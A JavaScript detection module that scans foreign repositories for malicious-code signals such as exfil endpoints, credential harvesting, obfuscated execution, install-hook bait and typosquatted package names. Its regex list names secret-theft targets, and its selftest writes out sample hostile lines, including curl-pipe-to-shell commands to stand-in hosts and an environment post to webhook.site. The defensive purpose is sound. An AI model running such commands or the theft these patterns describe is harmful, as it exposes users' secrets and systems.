/**
 * signals.mjs — קורפוס-איתותי-קוד-זדוני [t12 · owner law: "חשוב שלא ליפול על קוד זדוני בטעות"]
 * ═══════════════════════════════════════════════════════════════════════════════
 * The supply-chain shield for the learning pipeline. Every repo the scout studies
 * passes through here BEFORE any deep reading. Pure text analysis — NOTHING is
 * ever executed, installed, or built from foreign sources (LEARNING.md law L1).
 *
 * Severity model:
 *   critical → BLOCKED  (exfil endpoints, credential harvest, install-time bait,
 *                        obfuscated exec) — quarantined by name, never studied
 *   warn     → counts toward STUDY_WITH_CARE (typosquat, red-flag naming, hygiene)
 *
 * Dual-mode: exported pure functions + --selftest (zero network, must pass).
 */

/** @type {Array<{id:string, severity:'critical'|'warn', re:RegExp, why:string}>} */
export const MALICIOUS_PATTERNS = [
  // ── exfil endpoints ────────────────────────────────────────────────────────
  { id: 'exfil.webhook-site', severity: 'critical', re: /webhook\.site|requestbin|pipedream\.net\/r|hookb\.in|interact\.sh|oast\.(pro|fun|live)/i, why: 'interactive exfil/collab endpoint embedded in code' },
  { id: 'exfil.discord', severity: 'critical', re: /discord(?:app)?\.com\/api\/webhooks\/\d{15,}/i, why: 'discord webhook — classic token/data exfil channel' },
  { id: 'exfil.pastebin', severity: 'critical', re: /pastebin\.com\/raw\/[A-Za-z0-9]{6,}/i, why: 'remote payload fetched from pastebin raw' },
  { id: 'exfil.tunnel', severity: 'critical', re: /[a-z0-9-]+\.ngrok(-free)?\.(io|app|dev)|trycloudflare\.com/i, why: 'ad-hoc tunnel endpoint in shipped code' },
  // ── obfuscated execution ───────────────────────────────────────────────────
  { id: 'obf.eval-atob', severity: 'critical', re: /eval\s*\(\s*(atob|Buffer\.from)\s*\(|new\s+Function\s*\(\s*(atob|Buffer\.from)\s*\(/i, why: 'decoded-string execution' },
  { id: 'obf.hex-exec', severity: 'critical', re: /\\x[0-9a-f]{2}(\\x[0-9a-f]{2}){12,}/i, why: 'long hex-escape blobs (obfuscated payload)' },
  { id: 'obf.execjs-chain', severity: 'critical', re: /child_process[\s\S]{0,200}(curl|wget)[\s\S]{0,80}\|\s*(ba)?sh|powershell[\s\S]{0,40}(-enc|FromBase64String|IEX|Invoke-Expression)/i, why: 'download-and-execute chain' },
  { id: 'obf.string-array', severity: 'warn', re: /var\s+_0x[a-f0-9]{4,}\s*=\s*\[/i, why: 'javascript-obfuscator string-array signature' },
  // ── credential harvest ─────────────────────────────────────────────────────
  { id: 'cred.ssh-dir', severity: 'critical', re: /~\/\.ssh|\.ssh\/id_(rsa|ed25519)|id_rsa\.pub/i, why: 'reads SSH private keys' },
  { id: 'cred.env-sweep', severity: 'critical', re: /Object\.(keys|entries|values)\s*\(\s*process\.env|process\.env[^;\n]{0,60}(Object\.(keys|entries|values)|scan|enumerate)|fs\.(read|access)Sync\([^)]*\.env\b/i, why: 'sweeps environment/.env for secrets' },
  { id: 'cred.wallet', severity: 'critical', re: /wallet\.dat|metamask|keystore\/UTC--|phantom[-_]?wallet|solana[-_]?keygen|seed[-_]?phrase/i, why: 'targets crypto wallets / seed phrases' },
  { id: 'cred.browser-vault', severity: 'critical', re: /Login Data|Local State|Cookies sqlite|Default\/(Cookies|Network)/i, why: 'harvests browser credential stores' },
  // ── install-time bait ──────────────────────────────────────────────────────
  { id: 'install.postinstall-net', severity: 'critical', re: /"(pre|post)?install"\s*:\s*"[^"]*(curl|wget|http|node\s+-e|powershell|nc\s)/i, why: 'network/exec in package.json install hooks' },
  { id: 'install.git-hooks-bait', severity: 'warn', re: /git\s+config\s+--global\s+alias\.[^ ]+\s+!(?:curl|wget|sh)/i, why: 'git-alias shell bait' },
];

/** popular package names — typosquat reference set (bounded, high-value targets) */
export const POPULAR_PACKAGES = new Set([
  'react', 'vue', 'angular', 'express', 'axios', 'lodash', 'typescript', 'webpack',
  'babel', 'eslint', 'prettier', 'jest', 'mocha', 'chalk', 'commander', 'yargs',
  'dotenv', 'express-session', 'socket.io', 'next', 'nuxt', 'svelte', 'vite',
  'three', 'zod', 'prisma', 'tailwindcss', 'postcss', 'sass', 'less', 'nodemon',
  'pm2', 'cross-env', 'node-fetch', 'got', 'request', 'superagent', 'moment',
  'dayjs', 'uuid', 'jsonwebtoken', 'bcrypt', 'mongoose', 'mysql2', 'pg', 'redis',
  'steem', 'dsteem', 'bs58', 'secp256k1',
]);

/** repo-name / description red-flag bait vocabulary (warn-level: needs context) */
export const RED_FLAG_RE = /\b(airdrop|free[-_ ]?(crypto|eth|btc|usdt|gift)|claim[-_ ]?now|wallet[-_ ]?drainer|drainer|crack(ed)?|keygen|cheat|aimbot|hack(?:er|ing)?[-_ ]?tool|nuke|rat|stealer|logger|miner[-_ ]?(xmr|monero)|cripto|crpyto|paypel|amaz0n|gihub|javascirpt)\b/i;

/** bounded Levenshtein (cap 3 — cheap early-exit) for typosquat distance */
export function levenshtein(a, b, cap = 3) {
  if (a === b) return 0;
  if (Math.abs(a.length - b.length) > cap) return cap + 1;
  let v0 = Array.from({ length: b.length + 1 }, (_, i) => i);
  let v1 = new Array(b.length + 1);
  for (let i = 1; i <= a.length; i++) {
    v1[0] = i; let rowMin = v1[0];
    for (let j = 1; j <= b.length; j++) {
      const cost = a[i - 1].toLowerCase() === b[j - 1].toLowerCase() ? 0 : 1;
      v1[j] = Math.min(v1[j - 1] + 1, v0[j] + 1, v0[j - 1] + cost);
      if (v1[j] < rowMin) rowMin = v1[j];
    }
    if (rowMin > cap) return cap + 1;
    [v0, v1] = [v1, v0];
  }
  return v0[b.length];
}

/** package-name typosquat: distance ≤2 from a popular name (itself not popular) */
export function typosquatCheck(pkgName, popular = POPULAR_PACKAGES, maxDist = 2) {
  const n = String(pkgName || '').trim().replace(/^@[^/]+\//, '').toLowerCase();
  if (!n || popular.has(String(pkgName).toLowerCase())) return null;
  for (const p of popular) {
    const pn = p.replace(/^@[^/]+\//, '').toLowerCase();
    if (Math.abs(n.length - pn.length) > maxDist) continue;
    const d = levenshtein(n, pn, maxDist);
    if (d > 0 && d <= maxDist) return { suspect: n, popular: pn, distance: d };
  }
  return null;
}

/** scan arbitrary text → signal hits (deduped by id) */
export function scanText(text) {
  const t = String(text ?? '');
  if (!t) return [];
  const hits = [];
  const seen = new Set();
  for (const p of MALICIOUS_PATTERNS) {
    if (seen.has(p.id)) continue;
    if (p.re.test(t)) { hits.push({ id: p.id, severity: p.severity, why: p.why }); seen.add(p.id); }
  }
  return hits;
}

/** package.json object → signal hits (install bait + typosquat across deps) */
export function scanPackageJson(pkg, popular = POPULAR_PACKAGES) {
  const hits = [];
  if (!pkg || typeof pkg !== 'object') return hits;
  const hooks = ['preinstall', 'install', 'postinstall'];
  for (const h of hooks) {
    const cmd = pkg.scripts?.[h];
    if (cmd && /(curl|wget|http|node\s+-e|powershell|nc\s|eval|base64)/i.test(String(cmd))) {
      hits.push({ id: 'install.postinstall-net', severity: 'critical', why: `install hook "${h}" runs network/exec: ${String(cmd).slice(0, 80)}` });
    }
  }
  const depFields = ['dependencies', 'devDependencies', 'optionalDependencies'];
  const typos = new Map();
  for (const f of depFields) {
    for (const name of Object.keys(pkg[f] ?? {})) {
      const t = typosquatCheck(name, popular);
      if (t && !typos.has(t.suspect)) { typos.set(t.suspect, t); hits.push({ id: 'typosquat', severity: 'warn', why: `"${t.suspect}" mimics popular "${t.popular}" (dist ${t.distance})` }); }
    }
  }
  return hits;
}

/** verdict law (pure, selftest-anchored): signals[] → verdict */
export function verdictFromSignals(signals, redFlags = 0) {
  const crit = signals.filter((s) => s.severity === 'critical');
  const warn = signals.filter((s) => s.severity === 'warn');
  if (crit.length > 0) return { verdict: 'BLOCKED', reason: `critical-signal:${crit[0].id}`, critical: crit.length, warn: warn.length };
  if (warn.length >= 2 || redFlags > 0) return { verdict: 'STUDY_WITH_CARE', reason: warn.length >= 2 ? `${warn.length}-warn-signals` : 'name/description red-flag bait', critical: 0, warn: warn.length };
  return { verdict: 'SAFE_TO_STUDY', reason: 'clean', critical: 0, warn: warn.length };
}

/* ── selftest: zero network ──────────────────────────────────────────────── */
export function selftest() {
  // 1. benign text is clean
  const benign = scanText('A simple markdown parser for node. MIT licensed. See docs for usage.');
  if (benign.length !== 0) throw new Error(`benign flagged: ${JSON.stringify(benign)}`);
  // 2. exfil endpoint → critical → BLOCKED
  const exfil = scanText('fetch(`https://webhook.site/abc123`, {method:"POST", body:env})');
  if (exfil.length !== 1 || exfil[0].severity !== 'critical') throw new Error('exfil.webhook-site missed');
  if (verdictFromSignals(exfil).verdict !== 'BLOCKED') throw new Error('exfil must BLOCK');
  // 3. obfuscated exec chain
  const chain = scanText('require("child_process").execSync("curl -s http://x.sh | sh")');
  if (!chain.some((h) => h.id === 'obf.execjs-chain')) throw new Error('exec chain missed');
  // 4. credential sweep
  const cred = scanText('const keys = Object.entries(process.env); // harvest all');
  if (!cred.some((h) => h.id === 'cred.env-sweep')) throw new Error('env sweep missed');
  // 5. typosquat
  const t = typosquatCheck('reacr', POPULAR_PACKAGES);
  if (!t || t.popular !== 'react') throw new Error(`typosquat missed: ${JSON.stringify(t)}`);
  if (typosquatCheck('react', POPULAR_PACKAGES) !== null) throw new Error('popular itself must not flag');
  // 6. package.json install bait
  const bait = scanPackageJson({ scripts: { postinstall: 'curl -s http://evil.sh | sh' }, dependencies: { reacr: '^1' } });
  if (!bait.some((h) => h.id === 'install.postinstall-net' && h.severity === 'critical')) throw new Error('install bait missed');
  if (!bait.some((h) => h.id === 'typosquat')) throw new Error('pkg typosquat missed');
  // 7. verdict ladder
  if (verdictFromSignals([{ severity: 'warn', id: 'a' }]).verdict !== 'SAFE_TO_STUDY') throw new Error('1-warn should stay SAFE');
  if (verdictFromSignals([{ severity: 'warn', id: 'a' }, { severity: 'warn', id: 'b' }]).verdict !== 'STUDY_WITH_CARE') throw new Error('2-warn should be CARE');
  if (verdictFromSignals([], 1).verdict !== 'STUDY_WITH_CARE') throw new Error('redFlag should be CARE');
  // 8. levenshtein bounds (classic: saturday→sunday = 3; reacr→react = 1 substitution)
  if (levenshtein('saturday', 'sunday') !== 3) throw new Error('lev classic distance wrong');
  if (levenshtein('reacr', 'react') !== 1) throw new Error('lev single-substitution wrong');
  console.log('[scout/signals] selftest: PASS (benign-clean, exfil, exec-chain, cred-sweep, typosquat, install-bait, verdict-ladder, lev-bounds)');
  return 0;
}

const isMain = process.argv[1] && import.meta.url === new URL(`file://${process.argv[1]}`).href;
if (isMain) process.exit(selftest());
